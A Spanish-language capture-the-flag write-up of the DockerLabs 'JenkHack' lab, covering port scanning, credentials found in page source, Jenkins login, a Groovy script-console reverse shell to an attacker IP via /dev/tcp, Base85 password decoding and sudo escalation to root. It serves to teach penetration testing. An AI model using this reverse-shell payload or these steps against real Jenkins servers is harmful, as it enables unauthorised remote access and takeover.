# Informe de Penetration Testing – Máquina *JenkHack*

**Nivel:** Fácil

**Objetivo:** Obtener acceso root en la máquina vulnerable mediante Jenkins

![Logo](/JenkHack/Imagenes/Logo.jpeg)

---

## 1. Despliegue de la Máquina

Se descarga la máquina vulnerable desde el portal de DockerLabs, obteniendo un archivo comprimido llamado `jenkhack.zip`. Procedemos a descomprimirlo con el siguiente comando:

```bash
unzip jenkhack.zip
```

Luego, se despliega el contenedor utilizando el script proporcionado:

```bash
sudo bash auto_deploy.sh jenkhack.tar
```

![Despliegue](/JenkHack/Imagenes/Despliegue.jpeg)

Una vez desplegado, verificamos la conectividad hacia la máquina vulnerable con un simple ping:

```bash
ping -c1 172.17.0.2
```

![Ping](/JenkHack/Imagenes/Ping.jpeg)

---

## 2. Escaneo de Puertos

Realizamos un escaneo de puertos completo usando Nmap para identificar los servicios activos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Se identificaron los siguientes puertos abiertos: `80`, `443`, y `8080`.

![Puertos Abiertos](/JenkHack/Imagenes/Puerto.jpeg)

Con mi script personalizado `extractPorts`, extraigo los puertos abiertos y realizo un escaneo más profundo para obtener las versiones de los servicios:

```bash
nmap -sV -sC -p80,443,8080 172.17.0.2 -oG target.txt
```

![Servicios Detectados](/JenkHack/Imagenes/Servicios.jpeg)

---

## 3. Análisis Web

### Puerto 80 (HTTP)

Al acceder mediante navegador al puerto 80, observamos una página web sencilla.

![Página Web](/JenkHack/Imagenes/Pagina.jpeg)

### Puertos 443 y 8080

En el puerto 8080 se encuentra una interfaz de inicio de sesión que parece ser Jenkins. Al intentar autenticar, redirige a la página principal en el puerto 80 si las credenciales son válidas en el puerto 443 es la pagina para entrar a la pagina de Jenkins.

![Interfaz de Inicio de Sesión](/JenkHack/Imagenes/Registro.jpeg)

---

## 4. Revisión de Código Fuente y Credenciales

Realicé un análisis de código fuente del HTML alojado en el puerto 80. En el mismo se encontraron posibles credenciales embebidas:

* Usuario: `jenkins-admin`
* Contraseña: `cassandra`

![Código Fuente con Credenciales](/JenkHack/Imagenes/Fuente.jpeg)

Como solo había dos posibles valores, realicé un ataque de fuerza bruta manual combinando las credenciales. Logré iniciar sesión correctamente con:

* Usuario: `jenkins-admin`
* Contraseña: `cassandra`

![Sesión Iniciada](/JenkHack/Imagenes/Sesion.jpeg)
![Jenkins Panel](/JenkHack/Imagenes/Jenkins.jpeg)

---

## 5. Ejecución de Reverse Shell

Para obtener una shell inversa, primero configuramos un listener en la máquina atacante:

```bash
sudo nc -lvnp 4444
```

![Escucha Netcat](/JenkHack/Imagenes/Escucha.jpeg)

Dentro del panel de Jenkins, navegamos a:

`Administrador de Jenkins` → `Consola de scripts`

Allí ejecutamos el siguiente código Groovy para generar una reverse shell:

```groovy
def cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"]
def proc = new ProcessBuilder(cmd).redirectErrorStream(true).start()
proc.waitFor()
```

> Asegúrate de reemplazar `192.168.1.10` con la IP de tu máquina atacante.

![Consola Jenkins](/JenkHack/Imagenes/Consola.jpeg)
![Reverse Shell](/JenkHack/Imagenes/RevelShell.jpeg)

---

## 6. Post-Explotación

Ya dentro del sistema, identificamos que estamos dentro del contenedor como el usuario `jenkins`.

Navegando al directorio `/var/www/jenkhack` encontramos un archivo `note.txt` que contenía una cadena sospechosa codificada:

```
jenkhack:C1V9uBl8!'Ci*`uDfP
```

![Contenido del Archivo](/JenkHack/Imagenes/Terminal.jpeg)

La cadena parece estar codificada en Base85. Utilizamos Python para decodificarla:

```bash
python3
```

```python
import base64
base64.a85decode("C1V9uBl8!'Ci*`uDfP")
```

Esto reveló el texto plano: `jenkinselmejor`.

![Decodificación Base85](/JenkHack/Imagenes/Bash85.jpeg)

Estas nuevas credenciales (`jenkhack:jenkinselmejor`) nos permitieron cambiar de usuario en la máquina:

```bash
su jenkhack
```

---

## 7. Escalada de Privilegios

Con el nuevo usuario, verificamos los permisos `sudo`:

```bash
sudo -l
```

Esto reveló que teníamos permisos para ejecutar comandos como root sin contraseña. Aprovechamos esto para crear un script Bash que nos proporcionara un shell:

```bash
rm bash.sh
echo -e "#!/bin/bash\n\nexec /bin/bash" > bash.sh
chmod +x bash.sh
./bash.sh
```

![Evidencia Total](/JenkHack/Imagenes/ALL.jpeg)

Esto nos dio acceso root al sistema.

![Acceso Root](/JenkHack/Imagenes/Root.jpeg)

---

## Conclusión

La máquina vulnerable *JenkHack* permitió practicar varias fases del hacking ético:

* Reconocimiento con Nmap.
* Análisis web manual.
* Descubrimiento de credenciales en código fuente.
* Uso del panel de Jenkins para ejecutar comandos maliciosos.
* Decodificación de una contraseña en Base85.
* Escalada de privilegios mediante `sudo`.

Esta máquina es excelente para principiantes que deseen familiarizarse con Jenkins y técnicas comunes de explotación en contenedores Docker.
